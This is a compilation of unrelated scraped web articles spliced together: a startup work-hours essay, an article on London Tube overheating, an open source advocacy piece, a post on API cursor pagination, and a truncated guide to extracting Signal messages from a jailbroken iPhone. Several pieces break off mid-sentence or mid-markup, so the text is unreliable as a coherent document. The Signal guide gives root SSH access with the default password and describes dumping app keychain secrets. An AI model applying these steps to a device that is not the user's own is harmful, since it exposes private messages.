<p>Once these external pressures are internalized, companies tend to build a culture that encourages long hours. Managers then reward employees who put in the most time, and employees come to expect these working conditions. You can see this vicious cycle most prominently in <a href="https://abovethelaw.com/2019/12/the-biglaw-firm-where-associates-are-putting-in-the-most-working-hours/">law and consulting</a> where billable hours are a badge of honor.</p>
<h3 id="4-gatekeeping">4. Gatekeeping</h3>
<p>This might be controversial, but I believe that part of the reason startups tout their commitments to long hours is as a form of gatekeeping.</p>
<p>When you require everyone in your company to work 60+ hour weeks, you exclude people who have a family at home, kids they need to pick up from school, or mental health issues. This disproportionately hurts minorities, single parents, older workers, and <a href="https://www.telegraph.co.uk/news/2016/06/16/working-long-hours-harms-women-but-protects-men-study-shows/">women</a>, and it’s part of the reason we see fewer underrepresented groups in startups.</p>
<p>This isn’t always the case though. I remember meeting a CTO at another startup early in my career who quit work at 3 pm every day to pick up his kids. This <a href="https://www.karllhughes.com/posts/startup-culture">set a culture at the company</a>, which was totally different from my experience.</p>
<p><img src="https://i.imgur.com/ApmhcQ1.png" alt="Long hours is a form of gatekeeping"></p>
<h2 id="you-need-appropriate-pacing">You Need Appropriate Pacing</h2>
<p>All this pressure will eventually lead to burnout somewhere within your startup. Whether the founder cracks under pressure or you can’t retain employees because of the rigorous pace, it often hurts the organization in the long run.</p>
<p>Short sprints of long hours are possible - and in my experience, often necessary in a startup - but growing a successful company takes years, not months. No number of hours worked can shortcut this fact.</p>
<blockquote>
<p>“If you really look closely, most overnight successes took a long time.” – Steve Jobs</p>
</blockquote>
<p>The problem is that many founders get pressured into thinking short-term. Whether it’s investors pushing them to show traction required for future funding rounds or unfulfilled promises to customers, founders often overcommit themselves to a point where a sustainable pace is impossible.</p>
<h2 id="tips-for-startup-founders">Tips for Startup Founders</h2>
<p>At different stages of a company’s life, different levels of commitment are required. But, no matter what you’re working on, it’s not productive to keep grinding away month after month without giving yourself a break.</p>
<p>Similarly, if you have employees, <strong>you can’t expect them to selflessly spend their lives working long hours and holidays just to help you fulfill your dream.</strong> You <em>can</em> push people to a certain point, but learning how to do so in a productive and worthwhile way is one of the best things you can learn if you want to retain your best employees.</p>
<p>Here are four things I’ve learned about startup work hours and pacing as a founder:</p>
<h3 id="1-dont-push-people-without-a-purpose">1. Don’t Push People Without a Purpose</h3>
<p>It’s tempting as an entrepreneur to always want more from your employees, but just because you feel a sense of urgency in managing your business doesn’t mean every one of your employees will feel the same. <strong>One of the most frustrating things for employees is being pushed to work harder, longer hours without a clear purpose that ties directly into their performance.</strong></p>
<p>Similarly, if you do expect employees to work 60+ hours per week, be upfront with them about this expectation. There are plenty of young go-getters (I was one of them) who don’t mind putting in long hours but be aware that you might be missing some highly-qualified, experienced candidates with this approach.</p>
<h3 id="2-more-work-is-not-a-solution-to-poor-planning">2. More Work is Not a Solution to Poor Planning</h3>
<p>If one department in your company is behind on a deadline, figure out how you can work with them to either adjust expectations, change their requirements, or estimate better next time. Just because you or someone in your organization planned poorly does not mean it’s a good idea to push everyone else to the breaking point.</p>
<h3 id="3-listen-to-your-employees">3. Listen to Your Employees</h3>
<p>Even more important than avoiding situations that stress your employees is listening to them when they are feeling the pressure. If you’re cultivating the right atmosphere at the office, don’t be surprised when someone shows up to tell you that they can’t keep up the pace for another 60 hour week.</p>
<h3 id="4-trust-your-people">4. Trust Your People</h3>
<p>Finally, as an entrepreneur, you have to be able to trust your employees. If you don’t, you need to ask yourself why you hired them or find a way to replace them. When you trust your employees, you’ll know that when they insist they’re working too much, they really are.</p>
<p><em>Note: I’ve added a few books on this topic in <a href="https://www.karllhughes.com/posts/startup-books">my list of the best startup books for founders here</a>.</em></p>
<h2 id="questions-for-potential-startup-employees">Questions for Potential Startup Employees</h2>
<p>While the bulk of an early-stage startup’s culture is defined by the founders, employees and managers have a lot of influence on working hours and pacing too. If you’re being hired by a startup and you’re not sure about what the culture is like, here are some questions you can ask to get a better sense:</p>
<h3 id="1-how-many-hours-per-week-is-typical">1. How Many Hours Per Week is Typical?</h3>
<p>You can ask this question without sounding lazy. I always tell employees this expectation, but if you’re in an interview with a startup and they don’t say it explicitly, it’s better to know what they expect than to be surprised on your first day.</p>
<h3 id="2-do-you-have-typical-working-hours">2. Do You Have Typical Working Hours?</h3>
<p>Again, with more companies going remote, many are also giving employees the option to work their own hours. I have customers in Europe, Australia, Asia, and the US, so even though I try not to work more than 40 hours per week, I don’t have a very “typical” schedule.</p>
<h3 id="3-do-people-hang-out-outside-of-work-much">3. Do People Hang Out Outside of Work Much?</h3>
<p>I asked this question in interviews with startups because I wanted to know the dynamic of …</p></div></article></section></div>

            <!-- Share buttons by mashshare.net - Version: 3.7.2--><p>Calvin Barrows has written an article for railbusinessdaily.com about the root cause(s) of overheating in certain metro systems, using London Underground’s ‘Tube’ Network as an example.</p>
<p>Calvin is a Chartered Engineer, latterly retired. His work focused on forensic engineering, to establish the mechanisms of structural and mechanical failures; then continuing as an engineering manager, within the rail industry.</p>
<p>Sylvia Telatycka is co-author and linguist, who with Calvin runs a small but successful property development and rental business.</p>
<p>“This guest article aims to encourage a wider discussion around our hypothesis as to the root cause(s) of overheating in certain metro systems, using London Underground’s ‘Tube’ Network as an example.</p>
<p>Rather than go into complicated thermodynamic formulae to demonstrate the credible science upon which this theory is based, we have described in simple terms the comparable heat generation and heat exchange processes at work, to clarify how these affect this historic Tube network. This is important because, in the earliest days of the London Tube, overheating was simply not an issue…. but WHY….?</p>
<p>In the first instance, we need to understand clearly what the problem is. Paraphrasing Charles Kettering: a problem well defined is half solved and mindful of that, we took the basic premise of the Tube overheating and framed a series of questions to help identify the problem.</p>
<p>1. When does overheating happen?</p>
<p>2. Do ALL metros/subways overheat?</p>
<p>3. Why might some metros/subways overheat, and some might not?</p>
<p>4. And why are these questions relevant to London’s network?</p>
<p>5. How can this overheating be mitigated?</p>
<p>Few would disagree that the Tube overheats but understanding WHEN and WHERE it happens is most revealing. In winter passengers mainly travel bundled up in their winter coats and the saloons are heated. In summer, heavy clothing is shed – indeed some passengers have been known to travel in swimwear.</p>
<p><img src="https://mk0railbusinessipb4k.kinstacdn.com/wp-content/uploads/2020/08/Screenshot-2020-08-03-at-14.20.35.png" alt="" width="598" height="320" srcset="https://mk0railbusinessipb4k.kinstacdn.com/wp-content/uploads/2020/08/Screenshot-2020-08-03-at-14.20.35.png 598w, https://mk0railbusinessipb4k.kinstacdn.com/wp-content/uploads/2020/08/Screenshot-2020-08-03-at-14.20.35-300x161.png 300w" sizes="(max-width: 598px) 100vw, 598px"></p>
<p>In the above graph i, London’s mean surface ambient air temperatures, averaged over a 30 year period, show a clear increase from approximately -5°C in the winter to around +30°C in the summer.</p>
<p>Interestingly, the following graph ii represents the results of TfL’s temperature monitoring within the underground network, for both the deep tube and sub-surface lines. The TfL temperature variations not only confirm passengers’ subjective perception, they also mimic the curve of temperature data above and demonstrate conclusively that underground network temperatures align with the external seasonal temperatures.</p>
<p><img src="https://mk0railbusinessipb4k.kinstacdn.com/wp-content/uploads/2020/08/Screenshot-2020-08-03-at-14.22.17.png" alt="" width="587" height="298" srcset="https://mk0railbusinessipb4k.kinstacdn.com/wp-content/uploads/2020/08/Screenshot-2020-08-03-at-14.22.17.png 587w, https://mk0railbusinessipb4k.kinstacdn.com/wp-content/uploads/2020/08/Screenshot-2020-08-03-at-14.22.17-300x152.png 300w" sizes="(max-width: 587px) 100vw, 587px"></p>
<p>In the course of our research we looked at different types of rail networks, categorising them as follows because they all perform differently in relation to overheating:-</p>
<p>1. Metro train networks – which run ONLY underground.</p>
<p>2. Trains networks – which run predominately overground.</p>
<p>3. Metro train networks – which run both overground and underground.</p>
<p>Underground-only networks like Glasgow’s or Warsaw’s are not affected by the overground conditions, so there is little seasonal variation in train and network temperatures. Their ambient underground temperature remains about 16°C – unlike the wide temperature range the TfL data above show for London’s Tube network. Underground-only networks irrefutably demonstrate that operational heat such as braking, being generated year-round, is NOT a significant cause of metro networks overheating. Furthermore, since passengers are not being exposed to overheating they remain comfortable and safe.</p>
<p>Overground-only trains are cool in winter and therefore heated. However, in summer they will overheat, unless they are proactively cooled, usually by air-conditioning, though AC deals with the symptoms, not underlying causes, and it is environmentally unfriendly. Whilst AC is technically sound as long as it can discharge the exhaust heat to free air, if it does not work for some reason…. What then? There have been at least three incidents over the last 15 years where power failures compromised the AC, triggering saloon temperature rises to 46°C; with distressed passengers fainting from heat exhaustion, and others desperate enough to smash windows and even to try and break through emergency doors.</p>
<p>Which brings us neatly to MIXED metro networks like London’s Tube, which run both overground and underground, to see why this overheating is NOT restricted to the overground areas of these networks. The reason behind this apparent contradiction is that these mixed networks are, thermodynamically speaking, open systems – ones that freely exchange energy and matter with their surroundings – where:-</p>
<p>1. The free exchange of energy is a regular transfer of air in and out of the tunnels; and</p>
<p>2. The free exchange of mass is a regular travel of hot, loaded trains in and out of the tunnel.</p>
<p>TfL engineers continue to focus on ‘base load’, aka the operational heat, which by definition is year-round, so this can never explain the seasonal nature of the problem. Saloon AC is not a viable solution here, expelling more heat into an already overheated tunnel. We need to be thinking more holistically: rather than the ‘Cooling the Tube Project’ it should be the ‘Cooling the Whole Tube Network in the Summer Project’.</p>
<p>Clearly the root cause of this 100+ year old seasonal problem is the SUN. However, its sheer power to affect every aspect of a network like London’s Tube has been significantly underestimated. In a thermodynamic nutshell:-</p>
<p>1. Radiation from the sun is short wave energy in the form of light, which on striking the earth or a solid object increases their internal energy.</p>
<p>2. This internal energy is in the form of heat and is then re-radiated from the surface of the earth (and solid objects) as long wave heat energy, which in turn warms the ambient air.</p>
<p>The unintentional consequence of the above process in a thermodynamically open system is that hot ambient air plus heat from solar irradiated trains travelling on the surface is carried into the tunnels.</p>
<p>In the context of mixed metro networks, when overground, all external surfaces of the train exposed to the sun, including wheels and bogies, are being directly irradiated. Like any heat conductive surface, the irradiated train body get hot. The sun’s shortwave radiation readily shines through the window glass; then striking the internal surfaces is converted into heat within those materials. However, heat being longwave radiation and, struggling to pass back out through the window glass, is trapped – an unintended ‘greenhouse’ effect. Finally, the undercarriage components consist of massive chunks of metal – usually black – with the ability to absorb immense amounts of heat.</p>
<p>Furthermore, while rail buckling is a familiar problem, the knock-on effects of the sun on the track beds have never really figured in the context of the network overheating. The whole of the track bed including the rails is absorbing and reflecting heat. So, when trains pass over it, this heat is then reflected outwards and upwards into the wheels, bogies, underside of the carriages, the brakes and traction motors. These get super-heated, not so much through operation, but principally because they are in an overheated environment.</p>
<p><img src="https://mk0railbusinessipb4k.kinstacdn.com/wp-content/uploads/2020/08/Screenshot-2020-08-03-at-14.22.34.png" alt="" width="548" height="282" srcset="https://mk0railbusinessipb4k.kinstacdn.com/wp-content/uploads/2020/08/Screenshot-2020-08-03-at-14.22.34.png 548w, https://mk0railbusinessipb4k.kinstacdn.com/wp-content/uploads/2020/08/Screenshot-2020-08-03-at-14.22.34-300x154.png 300w" sizes="(max-width: 548px) 100vw, 548px"></p>
<p>The above concept graph predicts the build-up of solar irradiation acting on a train, starting early in the day and repeatedly travelling (in this example) the length of the Central Line. The train is irradiated when overground and dissipates a large proportion of that heat load during the underground sections of the journey. However, each irradiated train movement passing throughout the entire network compounds the effect of previous trains, elevating tunnel temperatures even more as the day progresses – rudimentary monitoring has shown saloon temperatures overground typically increase by up to 6°C in 30 mins between Leyton and Epping around 4.30-5.00pm on a summer afternoon.</p>
<p>While the piston-drag effect as the train passes in and out of the tunnel portals will draw in hot ambient air, probably contributing a small amount of heat to the underground sections, compared to the storage-radiator capacity of the train itself, cumulatively dissipating within the tunnel, it is unlikely to be that significant.</p>
<p>Having identified the root causes of overheating and the contributing factors, the task of managing the overheating in the tunnels is actually quite simple – deal with the overheating of the trains on the surface BEFORE THEY ENTER THE TUNNELS.</p>
<p>There are four obvious radiant barrier measures. These are solar-reflective paints (typical surface temperature reductions of 20⁰C) and Low E glass (absorbing some 80% less solar radiation than standard glass), both of which could be easily retroactively applied to existing trains and become the standard for new rolling stock. Then there is green planting on tracks, with its low heat absorption properties compared to ballast and rails. Once in place maintenance costs should be minimal and the benefits considerable. Lastly effective stabling of off-peak trains, providing appropriate solar shade AND ventilation, is imperative.</p>
<p>In conclusion, and most importantly, it should not be forgotten that overheating saloons will adversely affect passenger health and safety. In London’s Tube, this problem would be exacerbated in a ‘stalled-train event’ underground. Passengers overheated in a carriage, within an overheated tunnel, is a potentially fatal matter, especially when temperatures rise, as they often do in summer, to 40°C or higher and where passengers can do nothing but wait until LU staff can direct their escape.”</p>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article><figure> <figcaption>I know you want to. - Photo by Author </figcaption></figure> <p>You might not be aware of it, but you use some form of open source software every single day.</p> <p>Every time you start an app on your phone or launch a program on your computer, you profit from the code that someone has written for free.</p> <p>WordPress, the largest and most well-known content management system, is used by <a href="https://w3techs.com/technologies/details/cm-wordpress" rel="nofollow">38% of all websites</a> worldwide. It is open source and free to use.</p> <p>Linux is powering <a href="https://w3techs.com/technologies/details/os-linux" rel="nofollow">30% of all websites</a> globally. It is open source and free to use.</p> <p>These are just two examples out of a myriad of projects which were created to solve a problem or serve a use case.</p> <p>These projects became highly popular as communities formed around them. They tried to deliver the best product possible in terms of user experience, stability, security, and more.</p> <p>But not only the usage of open source projects is rising. The participation in the open source movement as a whole is growing as well.</p> <p>According to the <a href="https://octoverse.github.com/" rel="nofollow">State of the Octoverse report</a> by GitHub, out of more than 40 million developers on GitHub, 10 million new&nbsp;users joined in 2019 alone!</p> <p>The open source movement is growing quickly and you should become a part of it too.</p> <p>Whenever I see a new update for my operating system or new software releases of tools that I actively use every day, it makes me smile. I enjoy the thought of products continuously getting better and more sophisticated.</p> <p>Do you feel the same way?</p> <p>Here is why I am convinced that you should start contributing to open source software right now.</p> <h2>You can learn a lot from the source code</h2> <p>Since the source code in open source projects is available for anyone to read, that means that a large number of developers can battle-test and improve a project.</p> <p>Developers point out privacy or security issues, update the documentation, and improve source code to the newest web development standards all the time.</p> <p>Especially when you go through the code of projects with hundreds or even thousands of contributors, you can gain immense knowledge about best practices and code quality.</p> <p>Not only is reviewing the code itself a learning experience, but also the structure and folder hierarchy in larger projects is well thought-out and works well in the long run.</p> <h2>You will work with the smartest people</h2> <p>Compared to a company that has a limited number of employees to work on feature requests and bug fixes, you have the brightest minds working in open source development.</p> <p>In my imagination, I see it as swarm intelligence, which can solve every problem that arises.</p> <p>The more people that join a community, the better a project can scale. It can be like a buzzing beehive, where you could have pull requests to a codebase from users all around the world 24/7, non-stop.</p> <p>A good example is the well-known code editor <a href="https://github.com/microsoft/vscode" rel="nofollow">Visual Studio Code</a> which got very popular with a total of 1,200+ contributors on GitHub.</p> <p>You won’t see a single day without any pull requests on GitHub and the monthly release cycles always bring out new amazing features.</p> <p>When you participate in a project and submit a pull request, you will receive extremely helpful feedback from highly experienced maintainers. You can then implement that feedback to grow as a developer.</p> <h2>Your own code could be used globally</h2> <p>Since some software development projects are used by millions of users daily, it can be very rewarding to see your own code helping so many people.</p> <p>I wrote lint rules for the JavaScript projects called <a href="https://github.com/sindresorhus/eslint-plugin-unicorn" rel="nofollow">eslint-plugin-unicorn</a> and <a href="https://github.com/sveltejs/svelte" rel="nofollow">svelte</a>. It’s a great feeling knowing that my pull request will improve the code quality of many developers all around the world.</p> <p>From my personal experience, it is also motivating to get positive feedback in the form of a thankful comment.</p> <h2>Open source projects are inclusive</h2> <p>A great advantage of free open source software is that no one is excluded from using the product because they can’t afford it.</p> <p>While some open source projects cost money to use, most do not.</p> <p>Also, when you’re contributing to a project on GitHub, many of the bigger repositories have a code of conduct. These make sure that every contributor feels welcome and accepted in a project.</p> <h2>Projects are starting to become sustainable</h2> <p>The main goal of a company is to become profitable - which often leads to questionable decisions. But open source software focuses on solving the needs of its users as the highest priority.</p> <p>Most projects are entirely volunteer-supported, and project maintainers will unfortunately never see any financial reward. But there are great ways nowadays that you can help make these projects sustainable.</p> <p>With websites like <a href="https://opencollective.com/" rel="nofollow">OpenCollective</a>&nbsp;or <a href="https://github.com/sponsors" rel="nofollow">GitHub Sponsors</a>, you can donate to speed up the development of projects that you like.</p> <p>Personally, I think that it would be great if every company donated at least a small sum to open source software projects because they profit from these tools daily. Such support would reduce the stress for a lot of maintainers and some could even take up the work full-time.</p> <h2>How to contribute to open source</h2> <p>Contributing to open source development sounds more scary than it really is. There are plenty of projects out there on GitHub which encourage first time contributors and newbies to take action by labeling issues as “Good first issue”, “Beginner friendly” or “Help wanted”.</p> <p>Don’t know where to start?</p> <p>Ask yourself: what is an application that you enjoy using every day and where you would want to give back?</p> <p>It can be as simple as searching for that application on GitHub and looking through the open issues.</p> <p>It doesn’t have to be a code contribution, either - you can also help out by creating a pull request to update the documentation, fix typos that you find, or by doing a thorough code review.</p> <p>The <code>README.md</code> file of a project usually includes a passage of how to contribute.</p> <p>If you decide to contribute to a project, I recommend reading my article about&nbsp;<a href="https://markushatvan.com/blog/contributing-to-open-source-projects-the-right-way">Contributing To Open Source Projects The Right Way</a>. It’s a detailed step-by-step guide about the contribution workflow.</p> <p>I wrote it to be very beginner friendly, so don’t worry about becoming overwhelmed. You will be able to find your first project and submit a contribution in no time!</p> <h2>Wrapping up</h2> <p>It always impressed me that everyone in the world can join an open source software project and work on it.</p> <p>And open source software only works as a collaborative effort. The goal is to produce the best product or service without compromising on important factors like stability, security, or user privacy.</p> <p>I hope you understand the importance of open source software and that you value its benefits. No matter what your reasons are for giving back to the open source community, just know that you are highly appreciated!</p> <p>Many projects can only thrive with support and contributions from developers like you.</p> <h2>Helpful resources</h2> <ul><li><a href="https://octoverse.github.com/" rel="nofollow">The State of the Octoverse</a></li> <li><a

December 26, 2020 | https://solovyov.net/blog/2020/api-pagination-design/ | <a href="https://web.archive.org/web/*/https://solovyov.net/blog/2020/api-pagination-design/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="content"><p>Returning all results for a given query could be a challenge for an API, especially if there are thousands of results. It puts a load on a server, on a client, on a network, and often is unnecessary. Thus people invented pagination.</p>
<p>The usual way to paginate is an offset or a page number. So you make a request like that:</p>
<pre><code>GET /api/products?page=10
{"items": [...100 products]}
</code></pre>
<p>and to continue you make a request like that:</p>
<pre><code>GET /api/products?page=11
{"items": [...another 100 products]}
</code></pre>
<p>In case of a simple offset it’ll look like <code>?offset=1000</code> and <code>?offset=1100</code> — it’s the same old soup, just reheated. It’ll either go straight into SQL query like <code>OFFSET 1000 LIMIT 100</code> or will be multiplied by page size (that <code>LIMIT</code> value). In any case, it’s a suboptimal solution, since every database has to skip that 1000 rows. And to skip them it needs to identify them. It does not matter if it’s PostgreSQL, or ElasticSearch, or MongoDB, it’ll have to order them, count them, and throw them away.</p>
<p>This is a kind of work which no one needs. But it repeats over and over again since it’s <em>easy</em> to implement — you directly map your API onto your query to a database.</p>
<p>What do you do then? We could look at what databases do! They have this concept, called <a href="https://en.wikipedia.org/wiki/Cursor_(databases)">cursor</a> — it’s a pointer to a row. So you can say to a database “return me 100 rows after <strong>that</strong> one”. And it’s much easier for a database to do since there is a good chance that you’ll identify the row by a field with an index. And suddenly you don’t need to fetch and skip those rows, you’ll go directly past them.</p>
<p>An example:</p>
<pre><code>GET /api/products
{"items": [...100 products],
 "cursor": "qWe"}
</code></pre>
<p>API returns an (opaque) string, which you can use then to retrieve the next page:</p>
<pre><code>GET /api/products?cursor=qWe
{"items": [...100 products],
 "cursor": "qWr"}
</code></pre>
<p>Implementation-wise there are many options. Generally, you have some ordering criteria, for example, product id. In this case, you’ll encode your product id with some reversible algorithm (let’s say <a href="https://hashids.org/">hashids</a>). And on receiving a request with the cursor you decode it and generate a query like <code>WHERE id &gt; :cursor LIMIT 100</code>.</p>
<p>Just a little performance comparison, look at how offsets work:</p>
<pre><code>=# explain analyze select id from product offset 10000 limit 100;
                                                           QUERY PLAN                                                            
---------------------------------------------------------------------------------------------------------------------------------
 Limit  (cost=1114.26..1125.40 rows=100 width=4) (actual time=39.431..39.561 rows=100 loops=1)
   -&gt;  Seq Scan on product  (cost=0.00..1274406.22 rows=11437243 width=4) (actual time=0.015..39.123 rows=10100 loops=1)
 Planning Time: 0.117 ms
 Execution Time: 39.589 ms
</code></pre>
<p>And how where works:</p>
<pre><code>=# explain analyze select id from product where id &gt; 10000 limit 100;
                                                          QUERY PLAN                                                          
------------------------------------------------------------------------------------------------------------------------------
 Limit  (cost=0.00..11.40 rows=100 width=4) (actual time=0.016..0.067 rows=100 loops=1)
   -&gt;  Seq Scan on product  (cost=0.00..1302999.32 rows=11429082 width=4) (actual time=0.015..0.052 rows=100 loops=1)
         Filter: (id &gt; 10000)
 Planning Time: 0.164 ms
 Execution Time: 0.094 ms
</code></pre>
<p>That is a difference of several orders of magnitude! Of course, the actual numbers depend on a size of a table, on your filters and on a store implementation. There <a href="https://use-the-index-luke.com/no-offset">a great article</a> with more technical information - there are slides embedded, see slide 42 for performance comparison.</p>
<p>Of course, nobody orders products by an id — you usually order them by some relevancy (and then by id as a <a href="https://stackoverflow.com/a/17330992/46854">tie breaker</a>). In the real world, you’ll have to look at your data to determine what to do. Orders can be ordered by id (as it’s monotonically increasing). Wishlist items can be ordered like that as well — by wishlisting time. In our case products come from ElasticSearch, which naturally supports this cursor stuff.</p>
<p>One deficiency you can see is that it’s impossible to generate a “previous page” link with a stateless API. So in case of a user-facing pagination, if it’s important to have prev/next and “go directly to page 10” buttons there is no way around this offset/limit stuff. But in other cases using cursor-based pagination can greatly improve performance, especially on really big tables with really deep pagination.</p>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><section>
                <div>
                    <p>I started using Signal 5 years ago as I became increasingly conscious of my data footprint. Around the same time, I closed my Facebook and Instagram accounts, and later, my Google Account.</p><h2 id="the-problem-with-signal">The problem with Signal</h2><p>Signal makes it very difficult, and in most cases, impossible, for one to back up, export, or migrate message data. The Signal team insists these restrictions are meant to protect users’ privacy. However, backup and migration policies differ for each official Signal client and sometimes contradict each other.</p><p>For example, while iOS offers no official backups process, Android backups are built into the app. At the same time, iOS users can migrate their data to a new device (as long as their phone number hasn’t changed), but this is impossible on Android. Meanwhile, decrypting messages from the desktop client is trivial, but linking one’s phone and desktop client only syncs messages forward in time.</p><h2 id="why-export-signal-s-message-history">Why export Signal's message history</h2><p>Because it’s my fucking data.</p><p>The road to exporting my data was long, frustrating and filled with dead ends – it took over a year to get here. What's paradoxical is that someone else's phone turned out to be the key to my data. </p><p>In recent years, I moved most of my conversations to Signal, including those with family and close friends. Shortly after we started dating, I asked my partner to switch to Signal, and we’ve used it exclusively ever since. At some point, I thought it would be nice to export our conversation history – a sort of time capsule of our relationship. “Easy,” I thought. I was wrong.</p><p>Since we started dating, I had switched from a OnePlus 2 to an iPhone XS Max. And since migrating from Android to iOS isn’t possible, part of our conversation history was locked on my old phone. Jailbreaking the iPhone was out of the question since my version of iOS had not been jailbreaken. The Signal Desktop client could have offered an easy avenue to decrypt our chat history, but there was a period of several months during which I had not linked my iPhone to the Signal desktop client.</p><p>I opened a <a href="https://community.signalusers.org/t/ios-backups-through-the-desktop-client/8123">thread about this in the Signal Community Forum</a> in June of 2019. It quickly became apparent that backing up my Signal data would be an uphill battle. </p><p>Luckily, my partner had an iPhone 7, which she recently replaced with a company phone. Her old iPhone contained our entire message history in one place and was easy to jailbreak. Jackpot.</p><p>One important lesson I learned during this process:<strong> to ensure access to your conversation history, install the Desktop client and link it to your mobile device as soon as you start using Signal. </strong>The Signal database and encryption key are both accessible on your computer, allowing for easy decryption. Linking the desktop client later will only sync messages forward in time from the moment the devices are linked.</p><h2 id="tips-to-increase-your-chances-of-exporting-your-signal-database">Tips to increase your chances of exporting your Signal database</h2><p>If you haven’t linked the desktop client and extracting the iOS database is your only option, this guide is for you. If you've decided to embark upon this journey, here's some advice. </p><h3 id="stop-updating-ios">Stop updating iOS</h3><p>Your best chance of jailbreaking iOS is on older firmware versions. Turn off automatic updates and decline prompts to update iOS.</p><h3 id="backup-shsh-blobs-with-every-new-ios-update">Backup SHSH blobs with every new iOS update</h3><p><a href="https://en.wikipedia.org/wiki/SHSH_blob">SHSH blobs</a> are the digital signatures that Apple generates and uses to personalize iOS firmware files for each iOS device. Apple only signs firmware updates for a limited time after release. Having these signatures handy allows one to install versions of iOS after Apple stops signing them – like when a jailbreak becomes available for that version. In some cases, you may be able to downgrade iOS to a previous version.</p><p>Backup SHSH blobs every time Apple releases a new version of iOS (e.g., 14.0, 14.1, 14.1.1). I personally use the <a href="https://github.com/airsquared/blobsaver">blobsaver</a> app, but <a href="https://tsssaver.1conan.com/v2/">TSS Saver</a> is a popular alternative.</p><h3 id="learn-about-jailbreaking-and-stay-up-to-date-on-developments">Learn about jailbreaking and stay up to date on developments</h3><p>Developers and hackers are constantly working to break the security of iOS, and new methods to jailbreak iPhones are frequently made public.

root# &lt;command&gt;</code></pre><h3 id="step-1-jailbreak-ios">Step 1: Jailbreak iOS</h3><p>For iOS 13.6.1 on an iPhone 7, I used <strong>checkra1n</strong> which offers a straight forward semi-tethered jailbreak. Depending on the iPhone device and version of iOS, a jailbreak may or may not be available. </p><p>See this <a href="https://docs.google.com/spreadsheets/d/11DABHIIqwYQKj1L83AK9ywk_hYMjEkcaxpIg6phbTf0/edit#gid=1014970938">updated list of iOS jailbreaks</a> for device compatibility and instructions. </p><h3 id="step-2-ssh-into-the-iphone">Step 2: SSH into the iPhone </h3><p>Cydia usually comes with OpenSSH installed and enabled, allowing shell access over IP or USB. If SSH access isn't activated, launch Cydia and install OpenSSH. </p><p><strong>As always, the root password on iOS is <code>alpine</code>.</strong></p><p>If the iPhone and the host machine are on the same network, SSH into the phone using its IP address. It may be found in the phone's WiFi settings. </p><pre><code>$ ssh root@[iphone ip] -p 22</code></pre><p>If SSH over the air isn't possible, USB may be an alternative. However, this involves enabling a proxy service on the host machine.</p><p>First, install <em><em>libimobiledevice</em></em> on the host machine. </p><pre><code>$ brew install libimobiledevice</code></pre><p>Then, edit <em><em>com.usbmux.iproxy.plist</em></em> and append the following XML to the file. </p><pre><code>$ nano ~/Library/LaunchAgents/com.usbmux.iproxy.plist</code></pre><pre><code>&lt;?xml version="1.0" encoding="UTF-8"?&gt;
&lt;!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd"&gt;
&lt;plist version="1.0"&gt;
&lt;dict&gt;
&lt;key&gt;Label&lt;/key&gt;
&lt;string&gt;com.usbmux.iproxy&lt;/string&gt;
&lt;key&gt;ProgramArguments&lt;/key&gt;
&lt;array&gt;
&lt;string&gt;/usr/local/bin/iproxy&lt;/string&gt;
&lt;string&gt;2222&lt;/string&gt;
&lt;string&gt;22&lt;/string&gt;
&lt;/array&gt;
&lt;key&gt;RunAtLoad&lt;/key&gt;
&lt;true/&gt;
&lt;key&gt;KeepAlive&lt;/key&gt;
&lt;true/&gt;
&lt;/dict&gt;</code></pre><p>And finally, launch the proxy on the host machine. </p><pre><code>$ launchctl load ~/Library/LaunchAgents/com.usbmux.iproxy.plist</code></pre><p>It should now be possible to SSH into the iPhone over USB on port <code>2222</code>.</p><pre><code>$ ssh root@localhost -p 2222</code></pre><h3 id="step-3-install-required-packages">Step 3: Install required packages </h3><p>Once logged into to the iPhone's shell, install the following packages as they will come in handy. </p><pre><code>root# apt install zip unzip nano wget</code></pre><h3 id="step-4-backup-the-signal-data-directory">Step 4: Backup the Signal data directory</h3><p><strong>Locate Signal's data directory</strong></p><p>Much like macOS, iOS stores application data in a <em>Library</em>-like directory. In iOS&nbsp;13, its located here <code>/private/var/mobile/Containers/Shared/AppGroup/</code>. </p><p>Signal's data directory contains the encrypted SQLite database file in <code>./grdb/signal.sqilte</code> and attachments, such as images and videos in <code>./Attachments</code>.</p><p>The data directory may be found by searching the filesystem for Signal's encrypted database file, <code>signal.sqlite</code>.</p><pre><code>root# find / -type f -iname "signal.sqlite"</code></pre><p>That should return something which looks like this:<br><code>/private/var/mobile/Containers/Shared/AppGroup/01484069-3446-4CC0-8BE7-7464E7D08FDF/grdb/signal.sqlite</code> </p><p>The Signal directory is: <code>/private/var/mobile/Containers/Shared/AppGroup/01484069-3446-4CC0-8BE7-7464E7D08FDF/</code></p><p><strong>Zip the Signal directory</strong></p><p>It is recommended to zip the entire directory, not only the database file, as it also contains images and other message attachments. This archive can reach several gigabytes.</p><pre><code>root# cd /private/var/mobile/Containers/Shared/AppGroup/
root# zip -r signal-backup.zip &lt;Signal directory&gt;

# ex: zip -r signal-backup.zip /private/var/mobile/Containers/Shared/AppGroup/01484069-3446-4CC0-8BE7-7464E7D08FDF/</code></pre><p><strong>Retrieve the backup on the host machine</strong></p><p>In a new terminal session on the host machine, use <code>scp</code> to copy the backup. </p><pre><code>$ scp -P 22 root@localhost:/private/var/mobile/Containers/Shared/AppGroup/signal-backup.zip ~/</code></pre><p>Once complete, verify that the backup has fully transferred by unpacking it.</p><p>This is the most complex part of this operation and it helps to have a basic understanding of core iOS development concepts.</p><p><strong>Understanding iOS Entitlements </strong></p><p>From the <a href="https://developer.apple.com/documentation/bundleresources/entitlements">Apple Developer Documentation</a>: </p><blockquote>An entitlement is a right or privilege that grants an executable particular capabilities. For example, an app needs the HomeKit Entitlement — along with explicit user consent — to access a user’s home automation network. An app stores its entitlements as key-value pairs embedded in the code signature of its binary executable.</blockquote><p><strong>Enter Keychain Dumper</strong></p><p>We will use <a href="https://github.com/ptoomey3/Keychain-Dumper"><strong>Keychain-Dumper</strong></a> to attempt extracting the Signal encryption key. It requires entitlements to access Keychain data for any particular app. </p><p>Reading through Keychain-Dumper's GitHub issues, I learned that entitlements changed in iOS 13.5 – prior to this version, an application <a href="https://github.com/ptoomey3/Keychain-Dumper/issues/52#issuecomment-638174691">could be given wildcard 